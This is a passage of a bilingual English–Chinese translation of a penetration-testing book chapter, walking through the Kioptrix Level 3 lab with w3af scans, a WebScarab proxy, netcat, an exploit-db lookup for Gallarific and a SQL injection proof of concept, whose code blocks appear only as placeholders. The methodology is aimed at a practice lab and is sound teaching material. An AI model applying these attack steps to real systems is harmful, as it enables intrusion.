  id: totrans-218
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 接受第3级挑战 — Kioptrix
- en: Many of the techniques we want to cover in this chapter can be explored by taking
    on the challenge that the Kioptrix has made available for us. Let's take a look
    at the steps necessary to gain root on the Kioptrix machine.
  id: totrans-219
  prefs: []
  type: TYPE_NORMAL
  zh: 本章中我们想要涵盖的许多技术可以通过接受Kioptrix提供给我们的挑战来探索。让我们看一下获得Kioptrix机器root权限所需的步骤。
- en: Tip
  id: totrans-220
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 提示
- en: Open up BackTrack take a look at the web application at `Kioptrix3.com`. Browse
    around and review the source of the pages. There are some interesting notes and
    Easter eggs left out for us before even starting. Have fun with it!
  id: totrans-221
  prefs: []
  type: TYPE_NORMAL
  zh: 打开BackTrack，查看`Kioptrix3.com`的Web应用程序。浏览并查看页面的源代码。在开始之前，有一些有趣的注释和彩蛋留给我们。玩得开心！
- en: In general we would begin by scanning the server that hosts the web application.
    This infrastructure testing gives us a lot of information that comes in handy
    when trying to perform certain web application vulnerabilities. In this case,
    we know from using our Load Balance Detector that there is some load balancing
    going on. We also know that the servers are very similar to one another and are
    not leaving any clues as to what their real IP is. Our next step is to check if
    there are any noticeable web application firewalls we need to be aware of. If
    there are, we may need to use certain evasion techniques to bypass these restrictions.
  id: totrans-222
  prefs: []
  type: TYPE_NORMAL
  zh: 通常，我们将从扫描托管Web应用程序的服务器开始。这种基础设施测试为我们提供了许多在尝试执行某些Web应用程序漏洞时非常有用的信息。在这种情况下，我们知道使用我们的负载平衡检测器，正在进行一些负载平衡。我们还知道这些服务器彼此非常相似，并且没有留下任何线索表明它们的真实IP是什么。我们的下一步是检查是否有任何明显的Web应用程序防火墙需要我们注意。如果有的话，我们可能需要使用某些规避技术来绕过这些限制。
- en: In the real world, these systems are more than likely not even directly accessible
    due to firewall restrictions and network segmentation practices. Our goal is to
    be able to take over one of these servers and then pivot from that server onto
    the other one to take it out as well. After all, if the systems are completely
    identical all we have to do is get the credentials for one and we can take over
    all copies with said credentials.
  id: totrans-223
  prefs: []
  type: TYPE_NORMAL
  zh: 在现实世界中，由于防火墙限制和网络分割实践，这些系统很可能甚至无法直接访问。我们的目标是能够接管其中一个服务器，然后从该服务器转移到另一个服务器，然后将其关闭。毕竟，如果系统完全相同，我们只需要获取一个的凭据，就可以使用该凭据接管所有副本。
- en: Web Application Attack and Audit Framework (w3af)
  id: totrans-224
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: Web应用程序攻击和审计框架（w3af）
- en: This incredible framework automates many of the tasks that had previously been
    done manually. Fully extensible and open source w3af uses a myriad of plugins
    to provide a fully customizable testing experience. The authors of the tool created
    it to be very user friendly for those new at testing, as well as those who are
    expert penetration testers. If the plugin you need is not already available, then
    simply create it yourself and save tons of time on all future tests. w3af is constantly
    updated and improved. The plugin types that w3af includes cover discovery, brute
    forcing, auditing, and even evasion. The framework also includes auto update features
    to ensure that you always have the latest and greatest installed and ready to
    run. Learn more about this tool at [w3af.sourceforge.net](http://w3af.sourceforge.net).
  id: totrans-225
  prefs: []
  type: TYPE_NORMAL
- en: 'As expected, the BackTrack development team has preinstalled w3af. Open up
    your BackTrack virtual machine and select: **Applications | BackTrack | Vulnerability
    Assessment | Web Application Assessment | Web Vulnerability Scanners | w3af gui**
    to start the graphical user interface. If your BackTrack system is connected to
    the Internet you will be able to update the plugins to the latest version when
    prompted.'
  id: totrans-226
  prefs: []
  type: TYPE_NORMAL
- en: Note
  id: totrans-227
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Do not choose to update w3af from within BackTrack. When updating w3af on BackTrack
    5 r1 w3af no longer works. There are several steps that can be taken to install
    and configure the new dependencies, but this is outside the scope of this example.
  id: totrans-228
  prefs: []
  type: TYPE_NORMAL
- en: '![Web Application Attack and Audit Framework (w3af)](img/7744_05_17.jpg)'
  id: totrans-229
  prefs: []
  type: TYPE_IMG
- en: Typically, you would want to perform a very selective attack, especially if
    you are trying to test the detection capabilities of the client's administrators
    and security team.
  id: totrans-230
  prefs: []
  type: TYPE_NORMAL
- en: Note
  id: totrans-231
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Remember to stop Apache and start HAproxy on the Ubuntu machine before proceeding.
  id: totrans-232
  prefs: []
  type: TYPE_NORMAL
- en: In this case we will simply start with performing a **web_infrastructure** scan
    and see what information we can find on `Kioptrix3.com (192.168.75.200)`.
  id: totrans-233
  prefs: []
  type: TYPE_NORMAL
- en: '![Web Application Attack and Audit Framework (w3af)](img/7744_05_18.jpg)'
  id: totrans-234
  prefs: []
  type: TYPE_IMG
- en: Seems that w3af was able to detect that this site is being load balanced. On
    closer inspection you will notice that the reverse proxy can be utilized to prevent
    known issues from being exploited. Be sure to actually test the exploits (if it
    is covered in your Rules of Engagement), especially when you see that there may
    be a web application firewall or other mitigating control in place. The business
    will want to be assured that their expenditure on these devices or servers has
    either paid off, or that they are not working as intended.
  id: totrans-235
  prefs: []
  type: TYPE_NORMAL
- en: Using w3af GUI to save time
  id: totrans-236
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Now we will run a fast scan to determine what we can find. This will take a
    while so be sure to allot the time necessary to allow the test to finish.
  id: totrans-237
  prefs: []
  type: TYPE_NORMAL
- en: Note
  id: totrans-238
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: It is advisable to begin with smaller scans that provide you with information
    that can be used immediately and then follow up with more thorough scans that
    can take hours and even days. Penetration testing is generally (unfortunately)
    limited by a predetermined timeframe.
  id: totrans-239
  prefs: []
  type: TYPE_NORMAL
- en: While testing is in progress, you can look at the logs as they are updated under
    the **Log** tab. At times it may even be efficient to review the logs during the
    scan so that you are ready to take action once the results are received.
  id: totrans-240
  prefs: []
  type: TYPE_NORMAL
- en: 'Let''s review some of the findings:'
  id: totrans-241
  prefs: []
  type: TYPE_NORMAL
- en: '![Using w3af GUI to save time](img/7744_05_19.jpg)'
  id: totrans-242
  prefs: []
  type: TYPE_IMG
- en: The scan found instances of path disclosure, application errors, and that the
    server allows directory indexing. This information is useful to determine the
    next step.
  id: totrans-243
  prefs: []
  type: TYPE_NORMAL
- en: Scanning by using the w3af console
  id: totrans-244
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Many of us like to stay within console sections rather than using GUIs. With
    this in mind, we will run another scan and see if we find something more interesting
    than simple directory indexing and patch disclosure misconfigurations. This time
    we will use the console instead of the GUI.
  id: totrans-245
  prefs: []
  type: TYPE_NORMAL
- en: Note
  id: totrans-246
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Do not choose to update w3af from within BackTrack. When updating w3af on BackTrack
    5 r1 w3af no longer works. There are several steps that can be taken to install
    and configure the new dependencies, but this is outside the scope of this example.
  id: totrans-247
  prefs: []
  type: TYPE_NORMAL
  zh: 不要选择从BackTrack内部更新w3af。在BackTrack 5 r1上更新w3af后，w3af将不再工作。可以采取几个步骤来安装和配置新的依赖项，但这超出了本示例的范围。
- en: '[PRE21]'
  id: totrans-248
  prefs: []
  type: TYPE_PRE
  zh: '[PRE21]'
- en: '![Scanning by using the w3af console](img/7744_05_20.jpg)'
  id: totrans-249
  prefs: []
  type: TYPE_IMG
  zh: '![使用w3af控制台进行扫描](img/7744_05_20.jpg)'
- en: You can perform all of the critical functions available in w3af from within
    the w3af command console. The help command details options available. Let's begin
    the scan.
  id: totrans-250
  prefs: []
  type: TYPE_NORMAL
  zh: 您可以从w3af命令控制台执行所有可用的关键功能。help命令详细介绍了可用的选项。让我们开始扫描。
- en: 'We will begin by setting our targeted host:'
  id: totrans-251
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将从设置我们的目标主机开始：
- en: '[PRE22]'
  id: totrans-252
  prefs: []
  type: TYPE_PRE
  zh: '[PRE22]'
- en: From within the target menu we are able to set the target to `http://kioptrix3.com:`
  id: totrans-253
  prefs: []
  type: TYPE_NORMAL
  zh: 在目标菜单中，我们可以将目标设置为`http://kioptrix3.com:`
- en: '[PRE23]'
  id: totrans-254
  prefs: []
  type: TYPE_PRE
  zh: '[PRE23]'
- en: View will allow us to verify our configuration. If you take a look at the screenshot
    you can determine that the target was set up incorrectly. Using set target again
    with the appropriate setting will correct any issues you find.
  id: totrans-255
  prefs: []
  type: TYPE_NORMAL
  zh: View将允许我们验证我们的配置。如果您查看屏幕截图，您可以确定目标设置不正确。再次使用set target并使用适当的设置将纠正您发现的任何问题。
- en: '[PRE24]'
  id: totrans-256
  prefs: []
  type: TYPE_PRE
  zh: '[PRE24]'
- en: The back command will take you back to the last screen. Typing exit would exit
    from the w3af console which we do not want to do.
  id: totrans-257
  prefs: []
  type: TYPE_NORMAL
  zh: back命令将带您返回到上一个屏幕。输入exit将退出w3af控制台，这是我们不想要的。
- en: '![Scanning by using the w3af console](img/7744_05_21.jpg)'
  id: totrans-258
  prefs: []
  type: TYPE_IMG
  zh: '![使用w3af控制台进行扫描](img/7744_05_21.jpg)'
- en: '[PRE25]'
  id: totrans-259
  prefs: []
  type: TYPE_PRE
  zh: '[PRE25]'
- en: We can review the installed plugins by typing plugins into the console. This
    is very useful when determining which specific items you would like to run. You
    can also get information about each of the plugins from within this menu.
  id: totrans-260
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以通过在控制台中输入plugins来查看已安装的插件。这在确定您想要运行哪些特定项目时非常有用。您还可以从此菜单中获取有关每个插件的信息。
- en: '[PRE26]'
  id: totrans-261
  prefs: []
  type: TYPE_PRE
  zh: '[PRE26]'
- en: Use the help command from anywhere within the console if more information is
    needed, or you simply need to refresh your memory of where everything is.
  id: totrans-262
  prefs: []
  type: TYPE_NORMAL
  zh: 如果需要更多信息，或者您只需要刷新您对所有内容的记忆，请在控制台的任何位置使用help命令。
- en: '[PRE27]'
  id: totrans-263
  prefs: []
  type: TYPE_PRE
  zh: '[PRE27]'
- en: The profiles section is key to understanding what will be scanned. Just as with
    the GUI the profile determines which plugins will be run when you start the scan.
  id: totrans-264
  prefs: []
  type: TYPE_NORMAL
  zh: 配置文件部分是理解将要扫描的内容的关键。就像GUI一样，配置文件确定启动扫描时将运行哪些插件。
- en: '[PRE28]'
  id: totrans-265
  prefs: []
  type: TYPE_PRE
  zh: '[PRE28]'
- en: To ensure that we are running the proper profiles we check for available commands
    to find one that will provide us the information we require. If you know certain
    information about the site already, time can be saved by creating a custom profile
    to match the configuration you are scanning. For example, there is no point in
    scanning for IIS vulnerabilities on a server that is not using IIS.
  id: totrans-266
  prefs: []
  type: TYPE_NORMAL
  zh: 为了确保我们运行正确的配置文件，我们检查可用命令以找到提供所需信息的命令。如果您已经了解站点的某些信息，可以通过创建自定义配置文件来节省时间，以匹配您正在扫描的配置。例如，在未使用IIS的服务器上扫描IIS漏洞是没有意义的。
- en: '[PRE29]'
  id: totrans-267
  prefs: []
  type: TYPE_PRE
  zh: '[PRE29]'
- en: Here we are provided with a listing of preconfigured profiles that are available.
  id: totrans-268
  prefs: []
  type: TYPE_NORMAL
  zh: 这里提供了可用的预配置配置文件列表。
- en: '![Scanning by using the w3af console](img/7744_05_22.jpg)'
  id: totrans-269
  prefs: []
  type: TYPE_IMG
  zh: '![使用w3af控制台进行扫描](img/7744_05_22.jpg)'
- en: '[PRE30]'
  id: totrans-270
  prefs: []
  type: TYPE_PRE
  zh: '[PRE30]'
- en: The use command allows us to specify which profile we would like to use during
    the scan.
  id: totrans-271
  prefs: []
  type: TYPE_NORMAL
  zh: use命令允许我们指定在扫描期间要使用的配置文件。
- en: '[PRE31]'
  id: totrans-272
  prefs: []
  type: TYPE_PRE
  zh: '[PRE31]'
- en: We move back to the w3af default section and prepare to start the configured
    scan.
  id: totrans-273
  prefs: []
  type: TYPE_NORMAL
  zh: 我们返回到w3af默认部分，并准备开始配置的扫描。
- en: '[PRE32]'
  id: totrans-274
  prefs: []
  type: TYPE_PRE
  zh: '[PRE32]'
- en: '[PRE33]'
  id: totrans-275
  prefs: []
  type: TYPE_PRE
  zh: '[PRE33]'
- en: Output will allow you to set up the output types such as XML, text files, or
    even HTML. We enable the `htmlFile` output using the default settings (outputs
    to `report.html)` and keep console enabled as well for now.
  id: totrans-276
  prefs: []
  type: TYPE_NORMAL
  zh: Output将允许您设置输出类型，例如XML、文本文件，甚至HTML。我们使用默认设置启用`htmlFile`输出（输出到`report.html`），并暂时保持控制台启用。
- en: '[PRE34]'
  id: totrans-277
  prefs: []
  type: TYPE_PRE
  zh: '[PRE34]'
- en: This enables the HTML output.
  id: totrans-278
  prefs: []
  type: TYPE_NORMAL
  zh: 这将启用HTML输出。
- en: '[PRE35]'
  id: totrans-279
  prefs: []
  type: TYPE_PRE
  zh: '[PRE35]'
- en: As you have probably suspected, typing `start` will initiate our scan using
    the settings we have just configured. If there are errors, use the commands we
    just reviewed to examine and correct them. Remember to use help or back whenever
    you are stuck and do not know how to proceed.
  id: totrans-280
  prefs: []
  type: TYPE_NORMAL
  zh: 正如您可能已经猜到的那样，输入`start`将使用我们刚刚配置的设置来启动我们的扫描。如果有错误，请使用我们刚刚审查的命令来检查和纠正错误。记得在卡住并不知道如何继续时使用help或back。
- en: 'When the scan is finished you will be back at the w3af prompt. Looking at the
    results we find that there are still no distinct findings that could be used to
    quickly and easily take over the machine or gain a remote shell. Here we have
    browsed to the `report.html` location in Firefox to display the default HTML reporting
    format:'
  id: totrans-281
  prefs: []
  type: TYPE_NORMAL
  zh: 扫描完成后，您将回到w3af提示符。查看结果后，我们发现仍然没有明显的发现可以快速轻松地接管机器或获得远程shell。在这里，我们在Firefox中浏览到`report.html`位置，以显示默认的HTML报告格式：
- en: '![Scanning by using the w3af console](img/7744_05_23.jpg)'
  id: totrans-282
  prefs: []
  type: TYPE_IMG
  zh: '![使用w3af控制台进行扫描](img/7744_05_23.jpg)'
- en: 'We need to move on and make some minor modifications to our plugin selection
    to get to the juicy vulnerabilities. Plugins can be disabled, viewed, or enabled
    as follows:'
  id: totrans-283
  prefs: []
  type: TYPE_NORMAL
  zh: 我们需要继续进行一些小的修改，以选择插件以找到有趣的漏洞。插件可以禁用、查看或启用如下：
- en: '[PRE36]'
  id: totrans-284
  prefs: []
  type: TYPE_PRE
  zh: '[PRE36]'
- en: '[PRE37]'
  id: totrans-285
  prefs: []
  type: TYPE_PRE
  zh: '[PRE37]'
- en: We can review which of the plugins are enabled by typing the category such as
    `audit`. Here we discern which audit plugins were enabled when we used the `audit_high_risk`
    profile.
  id: totrans-286
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以通过输入类别（例如`audit`）来查看启用了哪些插件。在这里，我们可以确定在使用`audit_high_risk`配置文件时启用了哪些审计插件。
- en: '[PRE38]'
  id: totrans-287
  prefs: []
  type: TYPE_PRE
  zh: '[PRE38]'
- en: 'This command provides the following console output:'
  id: totrans-288
  prefs: []
  type: TYPE_NORMAL
  zh: 此命令提供以下控制台输出：
- en: '![Scanning by using the w3af console](img/7744_05_24.jpg)'
  id: totrans-289
  prefs: []
  type: TYPE_IMG
  zh: '![使用w3af控制台进行扫描](img/7744_05_24.jpg)'
- en: Some really important plugins were not enabled. We need to enable `localFileInclude`
    and `xss` and `rescan`.
  id: totrans-290
  prefs: []
  type: TYPE_NORMAL
  zh: 一些非常重要的插件未启用。我们需要启用`localFileInclude`、`xss`和`rescan`。
- en: '[PRE39]'
  id: totrans-291
  prefs: []
  type: TYPE_PRE
  zh: '[PRE39]'
- en: Verify that all settings are accurate; set the target again if you experience
    an error and start the scan back up again. After the scan has completed take a
    look at the findings. You should notice that local file inclusion vulnerability
    has been detected. We have also detected many unidentified we application errors
    at [http://kioptrix3.com/gallery](http://kioptrix3.com/gallery). We could either
    go back into our scanner and enable all plugins and try again, or we can take
    a manual look at the suspicious URL.
  id: totrans-292
  prefs: []
  type: TYPE_NORMAL
  zh: 验证所有设置是否准确；如果遇到错误，请重新设置目标，然后重新开始扫描。扫描完成后，查看结果。您应该注意到已检测到本地文件包含漏洞。我们还在[http://kioptrix3.com/gallery](http://kioptrix3.com/gallery)上检测到许多未知的Web应用程序错误。我们可以重新进入扫描程序并启用所有插件，然后再次尝试，或者我们可以手动查看可疑的URL。
- en: Using WebScarab as a HTTP proxy
  id: totrans-293
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 使用WebScarab作为HTTP代理
- en: It is beneficial to have a web proxy enabled and logging all manual penetration
    testing activity. After all, you will need to be able to replicate your steps
    as well as write reports that indicate the steps taken during testing. WebScarab
    can be found in BackTrack by choosing **Applications | BackTrack | Vulnerability
    Assessment | Web Application Assessment | Web Vulnerability Scanners | WebScarab**.
  id: totrans-294
  prefs: []
  type: TYPE_NORMAL
  zh: 启用Web代理并记录所有手动渗透测试活动是有益的。毕竟，您需要能够复制您的步骤，并撰写指示测试过程中所采取的步骤的报告。在BackTrack中，可以通过选择**应用程序
    | BackTrack | 漏洞评估 | Web应用程序评估 | Web漏洞扫描程序 | WebScarab**找到WebScarab。
- en: Note
  id: totrans-295
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: WebScarab will initially use the WebScarab Lite interface. This can be changed
    by using the **Tools** drop down and selecting **Use Full Interface** and restarting
    the tool.
  id: totrans-296
  prefs: []
  type: TYPE_NORMAL
  zh: WebScarab最初将使用WebScarab Lite界面。可以通过使用**工具**下拉菜单并选择**使用完整界面**来更改，并重新启动工具。
- en: WebScarab is a HTTP proxy provided by the OWASP team that will assist in analyzing
    your HTTP traffic. We will need to point our browser to use the proxy once it
    has been started.
  id: totrans-297
  prefs: []
  type: TYPE_NORMAL
  zh: WebScarab是OWASP团队提供的HTTP代理，将帮助分析您的HTTP流量。一旦启动，我们需要将浏览器指向使用代理。
- en: 'Load up Firefox, choose **Edit | Preferences | Options | Advanced Tab | Network
    Tab** and click on the **Settings** button. Select the **Manual proxy configuration:**
    radial button and configure the following settings:'
  id: totrans-298
  prefs: []
  type: TYPE_NORMAL
  zh: 加载Firefox，选择**编辑 | 首选项 | 选项 | 高级选项卡 | 网络选项卡**，然后单击**设置**按钮。选择**手动配置代理：**单选按钮，并配置以下设置：
- en: '**HTTP Proxy:** localhost | Port: 8008.'
  id: totrans-299
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**HTTP代理：**localhost | 端口：8008。'
- en: '**SSL Proxy:** localhost | Port: 8008.'
  id: totrans-300
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**SSL代理：**localhost | 端口：8008。'
- en: '**No Proxy for:** DELETE ENTRIES HERE. Blank.'
  id: totrans-301
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**不使用代理：**删除此处的条目。空白。'
- en: 'The default listener should be able to pick up your session. Now in your browser
    head over to [http://kioptrix3.com](http://kioptrix3.com). If everything is working
    properly and you receive no errors, head over to [http://kioptrix3.com/gallery/](http://kioptrix3.com/gallery/)
    and click back over to WebScarab and choose the **Summary** tab to review our
    proxy results:'
  id: totrans-302
  prefs: []
  type: TYPE_NORMAL
  zh: 默认监听器应该能够捕获您的会话。现在在浏览器中转到[http://kioptrix3.com](http://kioptrix3.com)。如果一切正常，并且没有收到错误，请转到[http://kioptrix3.com/gallery/](http://kioptrix3.com/gallery/)，然后返回到WebScarab并选择**摘要**选项卡以查看我们的代理结果：
- en: '![Using WebScarab as a HTTP proxy](img/7744_05_25.jpg)'
  id: totrans-303
  prefs: []
  type: TYPE_IMG
  zh: '![使用WebScarab作为HTTP代理](img/7744_05_25.jpg)'
- en: 'One thing instantly confirms the problem with unknown application error issues
    that w3af ran into. The URL [http://kioptrix3.com/gallery/](http://kioptrix3.com/gallery/)
    is already is returning a 500 Application Error before a SQL injection attack
    is even attempted. Automated scanners have a difficult time with abnormal behavior
    and thus, we must investigate further on our own. If this concept is confusing
    at this time, try the following to confirm our suspicions are correct. Open up
    a new BackTrack terminal session and invoke netcat:'
  id: totrans-304
  prefs: []
  type: TYPE_NORMAL
  zh: 有一件事立即确认了w3af遇到的未知应用程序错误问题。在尝试进行SQL注入攻击之前，URL [http://kioptrix3.com/gallery/](http://kioptrix3.com/gallery/)已经返回了500应用程序错误。自动化扫描程序很难处理异常行为，因此，我们必须进一步调查。如果这个概念在这个时候让您感到困惑，请尝试以下方法来确认我们的怀疑是正确的。打开一个新的BackTrack终端会话并调用netcat：
- en: '[PRE40]'
  id: totrans-305
  prefs: []
  type: TYPE_PRE
  zh: '[PRE40]'
- en: 'When the connection is made enter the following:'
  id: totrans-306
  prefs: []
  type: TYPE_NORMAL
  zh: 当连接建立时，输入以下内容：
- en: '[PRE41]'
  id: totrans-307
  prefs: []
  type: TYPE_PRE
  zh: '[PRE41]'
- en: 'We are pulling the data directly that gives us the most control over the information.
    When in doubt, use netcat! The output is as follows:'
  id: totrans-308
  prefs: []
  type: TYPE_NORMAL
  zh: 我们直接获取数据，这样可以更好地控制信息。如果有疑问，使用netcat！输出如下：
- en: '[PRE42]'
  id: totrans-309
  prefs: []
  type: TYPE_PRE
  zh: '[PRE42]'
- en: The highlighted section confirms that the application immediately returns an
    error code AND the requested page.
  id: totrans-310
  prefs: []
  type: TYPE_NORMAL
  zh: 突出显示的部分确认应用程序立即返回错误代码和请求的页面。
- en: It is time to use WebScarab to intercept our messages to see exactly what we
    are dealing with. In WebScarab open up the **Proxy** tab, click on the **Manual
    Edit** tab and check the **Intercept responses** box. By intercepting the responses
    we are able to review the packages to see if there is anything interesting being
    passed to the server. We can also change any variables or hidden fields now if
    we want to.
  id: totrans-311
  prefs: []
  type: TYPE_NORMAL
  zh: 现在是时候使用WebScarab拦截我们的消息，看看我们正在处理什么。在WebScarab中打开**代理**选项卡，点击**手动编辑**选项卡，并选中**拦截响应**框。通过拦截响应，我们能够查看传递给服务器的数据包，看看是否有任何有趣的内容。现在，如果需要，我们也可以更改任何变量或隐藏字段。
- en: 'Now that we are intercepting go back to your browser screen and reload the
    [http://kioptrix3.com/gallery/](http://kioptrix3.com/gallery/) page. You will
    be presented with the following:'
  id: totrans-312
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们正在拦截，回到浏览器屏幕并重新加载[http://kioptrix3.com/gallery/](http://kioptrix3.com/gallery/)页面。您将看到以下内容：
- en: '![Using WebScarab as a HTTP proxy](img/7744_05_26.jpg)'
  id: totrans-313
  prefs: []
  type: TYPE_IMG
  zh: '![使用WebScarab作为HTTP代理](img/7744_05_26.jpg)'
- en: The data that was intercepted will include the response returned in both a parsed
    and raw format. It is critical that you understand what normal responses should
    look like. These are the clues that will enable you to excel at finding vulnerabilities
    in the web applications. In this case we can see once again that the server responds
    with a 500 Internal Server Error in its header. When looking at the raw source
    we also see that there are some references to something called Gallarific. As
    with any piece of software, you should perform a quick lookup for known vulnerabilities
    when you are able to determine what is running.
  id: totrans-314
  prefs: []
  type: TYPE_NORMAL
  zh: 被拦截的数据将包括以解析和原始格式返回的响应。您必须了解正常响应应该是什么样子的。这些是能够帮助您在Web应用程序中发现漏洞的线索。在这种情况下，我们可以再次看到服务器在其标头中以500内部服务器错误的形式响应。当查看原始源时，我们还看到一些关于Gallarific的引用。与任何软件一样，当您能够确定正在运行的内容时，您应该快速查找已知的漏洞。
- en: Note
  id: totrans-315
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: 'Remember the process: Find out what is running, determine if it is set up correctly
    and/or if there are known vulnerabilities, then test.'
  id: totrans-316
  prefs: []
  type: TYPE_NORMAL
  zh: 记住这个过程：找出正在运行的内容，确定它是否设置正确和/或是否存在已知的漏洞，然后进行测试。
- en: 'Head on over to [http://www.exploit-db.com](http://www.exploit-db.com) and
    perform a search for GALLARIFIC. The current results are as follows:'
  id: totrans-317
  prefs: []
  type: TYPE_NORMAL
  zh: 前往[http://www.exploit-db.com](http://www.exploit-db.com)搜索GALLARIFIC。当前结果如下：
- en: '![Using WebScarab as a HTTP proxy](img/7744_05_27.jpg)'
  id: totrans-318
  prefs: []
  type: TYPE_IMG
  zh: '![使用WebScarab作为HTTP代理](img/7744_05_27.jpg)'
- en: We have three different exploits to choose from just for this simple application.
    That does not even count the local file injection that we were able to locate
    using our automated tools. If you choose the top item in the list which is the
    **GALLARIFFIC PHP Photo Gallery** exploit, you will see that the person that submitted
    the exploit was even nice enough to include the path to the admin panel at [http://kioptrix3.com/gallery/gadmin/](http://kioptrix3.com/gallery/gadmin/),
    in case we had missed it in our previous scan results (remember seeing the notice
    about something interesting being commented out:`<!-- a href="gadmin">Admin</a>&nbsp;
    &nbsp; -->` ?).
  id: totrans-319
  prefs: []
  type: TYPE_NORMAL
  zh: 我们有三种不同的利用程序可供选择，仅针对这个简单的应用程序。这甚至没有计算我们能够使用自动化工具找到的本地文件注入。如果您选择列表中的顶部项目，即**GALLARIFFIC
    PHP照片库**利用程序，您将看到提交利用程序的人甚至很好地包括了指向管理面板的路径[http://kioptrix3.com/gallery/gadmin/](http://kioptrix3.com/gallery/gadmin/)，以防我们在以前的扫描结果中错过了它（还记得看到有关某些有趣内容被注释掉的通知吗：`<!--
    a href="gadmin">Admin</a>&nbsp; &nbsp; -->`）。
- en: Note
  id: totrans-320
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: Remember that exploit-db is already on your BackTrack machine! If you are on
    a segmented network as you should be, there is no reason to leave to pull down
    exploit code or proof of concept instructions. You already have it on your machine!
  id: totrans-321
  prefs: []
  type: TYPE_NORMAL
  zh: 请记住，exploit-db已经在您的BackTrack机器上！如果您像应该一样在分段网络上，就没有理由离开以下载利用代码或概念证明说明。您已经在您的机器上拥有它！
- en: 'If you performed your searches for Gallarific properly you will find other
    vulnerabilities as well. Here are some associated CVE references:'
  id: totrans-322
  prefs: []
  type: TYPE_NORMAL
  zh: 如果您正确地搜索了Gallarific，您还会发现其他漏洞。以下是一些相关的CVE参考：
- en: CVE-2008-1326
  id: totrans-323
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: CVE-2008-1326
- en: CVE-2008-1327
  id: totrans-324
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: CVE-2008-1327
- en: CVE-2008-1464
  id: totrans-325
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: CVE-2008-1464
- en: CVE-2008-1469
  id: totrans-326
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: CVE-2008-1469
- en: CVE-2008-6567
  id: totrans-327
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: CVE-2008-6567
- en: Tip
  id: totrans-328
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 提示
- en: The OSVDB (Open Source Vulnerability Database) at [http://osvdb.org/](http://osvdb.org/)
    is also a great resource when trying to find information about software vulnerabilities.
    If you find a vulnerable software version, odds are that you will also find any
    associated proof of concept code if it exists, as the Exploit-DB team has expended
    a lot of effort in ensuring that their CVEs link up to the OSVDB.
  id: totrans-329
  prefs: []
  type: TYPE_NORMAL
  zh: 在尝试查找有关软件漏洞的信息时，OSVDB（开放源代码漏洞数据库）[http://osvdb.org/](http://osvdb.org/)也是一个很好的资源。如果您找到一个有漏洞的软件版本，很可能您还会找到任何相关的概念证明代码（如果存在的话），因为Exploit-DB团队已经在确保他们的CVE与OSVDB相匹配上花费了很多精力。
- en: Now looking at the exploit definition we see that there is example code provided
    as follows (credit goes to AtT4CKxT3rR0r1ST for submitting this proof of concept
    exploit code to `Exploit-DB.com):`
  id: totrans-330
  prefs: []
  type: TYPE_NORMAL
  zh: 现在看一下利用定义，我们看到提供了示例代码（感谢AtT4CKxT3rR0r1ST将此概念证明利用代码提交给`Exploit-DB.com）`：
- en: '[PRE43]'
  id: totrans-331
  prefs: []
  type: TYPE_PRE
  zh: '[PRE43]'
- en: Tip
  id: totrans-332
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 提示
- en: Turn off intercepts unless you want to acknowledge each response.
  id: totrans-333
  prefs: []
  type: TYPE_NORMAL
  zh: 除非您希望确认每个响应，否则请关闭拦截。
- en: 'Of course, for us to use this example we need to make a few changes. For one,
    we need to correct the [www.site.com](http://www.site.com) entry. Replace this
    with `kioptrix3.com`. Then we need add our gallery sub folder so that we address
    the correct site:'
  id: totrans-334
  prefs: []
  type: TYPE_NORMAL
  zh: 当然，为了使用这个例子，我们需要做一些更改。首先，我们需要更正[www.site.com](http://www.site.com)条目。将其替换为`kioptrix3.com`。然后我们需要添加我们的图库子文件夹，以便我们访问正确的站点：
- en: '[PRE44]'
  id: totrans-335
  prefs: []
  type: TYPE_PRE
  zh: '[PRE44]'
- en: If you try this code you will find that it does not work as planned. We need
    to go back to our web application testing basics and determine what the problem
    is. Let's try something here and see what happens. We will simplify the query
    and see if it works.
  id: totrans-336
  prefs: []
  type: TYPE_NORMAL
  zh: 如果您尝试此代码，您会发现它并没有按计划工作。我们需要回到我们的Web应用程序测试基础知识，并确定问题所在。让我们在这里尝试一些东西，看看会发生什么。我们将简化查询并查看是否有效。
- en: '[PRE45]'
  id: totrans-337
  prefs: []
  type: TYPE_PRE
  zh: '[PRE45]'
- en: 'In response we still receive the following error:'
  id: totrans-338
  prefs: []
  type: TYPE_NORMAL
  zh: 作为回应，我们仍然收到以下错误：
- en: '[PRE46]'
  id: totrans-339
  prefs: []
  type: TYPE_PRE
  zh: '[PRE46]'
- en: 'If you are familiar with SQL injection you already know the problem. We are
    addressing too many columns. Now we will iterate through the column count until
    we no longer receive an error message. Try the following:'
  id: totrans-340
  prefs: []
  type: TYPE_NORMAL
  zh: 如果您熟悉SQL注入，您已经知道问题所在。我们正在处理太多列。现在我们将通过列计数进行迭代，直到我们不再收到错误消息。尝试以下操作：
- en: '[PRE47]'
  id: totrans-341
  prefs: []
  type: TYPE_PRE
  zh: '[PRE47]'
